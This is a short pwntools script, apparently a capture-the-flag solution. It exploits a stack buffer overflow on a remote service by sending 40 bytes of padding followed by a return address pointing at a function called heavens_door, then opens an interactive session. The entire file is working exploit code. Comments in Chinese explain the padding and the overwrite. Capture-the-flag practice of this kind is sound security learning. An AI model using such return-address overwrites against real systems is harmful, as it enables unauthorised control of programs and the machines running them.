from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = remote('110.42.112.160', 46845)         
  
payload = b'A' * 40                # 填充 40 字节
payload += p64(0x401240)           # 覆盖返回地址 → heavens_door

p.send(payload)                    # 程序打印完提示后 read，直接发
p.interactive()